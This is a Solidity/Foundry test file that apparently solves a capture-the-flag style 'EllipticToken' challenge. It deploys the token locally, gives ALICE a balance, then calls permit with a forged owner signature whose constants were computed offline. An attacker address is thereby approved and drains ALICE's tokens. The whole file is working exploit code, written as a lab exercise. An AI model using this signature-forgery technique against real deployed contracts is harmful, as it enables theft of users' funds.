// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {EllipticToken} from "../src/EllipticToken.sol";

contract EllipticTokenExploit is Test {
    EllipticToken token;

    address constant BOB   = 0xB0B14927389CB009E0aabedC271AC29320156Eb8;
    address constant ALICE = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

    function setUp() public {
        // reproduce EllipticTokenFactory.createInstance locally
        token = new EllipticToken();
        token.transferOwnership(BOB);

        bytes memory bobSig   = hex"085a4f70d03930425d3d92b19b9d4e37672a9224ee2cd68381a9854bb3673ef86b35cfdeee0fb1d2168587fb188eefb4fe046109af063bf85d9d3d6859ceb4451c";
        bytes memory aliceSig = hex"ab1dcd2a2a1c697715a62eb6522b7999d04aa952ffa2619988737ee675d9494f2b50ecce40040bcb29b5a8ca1da875968085f22b7c0a50f29a4851396251de121c";
        bytes32 salt = keccak256("BOB and ALICE are part of the secret sauce");

        token.redeemVoucher(10 ether, ALICE, salt, bobSig, aliceSig);
        assertEq(token.balanceOf(ALICE), 10 ether);
    }

    function test_drainAlice() public {
        // 1. attacker identity — a key you generate in the test itself
        uint256 attackerKey = 0xA11CE; /* pick any nonzero uint */
        address attacker = vm.addr(attackerKey);

        // 2. the forged (amount, r, s, v) — computed offline by
        //    script/recover_pubkey.py's forge(a, b, Q_A), pasted in as constants
        uint256 amount = 0xc63c77409ca2154f3808507d07f3ac0c4c61578ea06f99ab9c83fc9970c7c4e4; // = e from forge()
        bytes32 r = 0xb47af4938548c0bcfa7071ce6d307201cdd81834411e0d6e38226fbf71c50394;
        bytes32 s = 0x2a5d3faca421e43527b7e2fd6e499bd3e9a7f183fba7119ff1aa3202fe51c07d;
        uint8   v = 28;

        // 3. a normal signature from the attacker over permitAcceptHash
        bytes32 permitAcceptHash = keccak256(abi.encodePacked(ALICE, attacker, amount));
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(attackerKey, permitAcceptHash);

        // 4. call permit with the forged owner sig + real spender sig
        token.permit(amount, attacker, abi.encodePacked(r, s, v), abi.encodePacked(r2, s2, v2));

        // 5. drain
        vm.prank(attacker);
        token.transferFrom(ALICE, attacker, 10 ether);

        // 6. win condition
        assertEq(token.balanceOf(ALICE), 0);
    }
}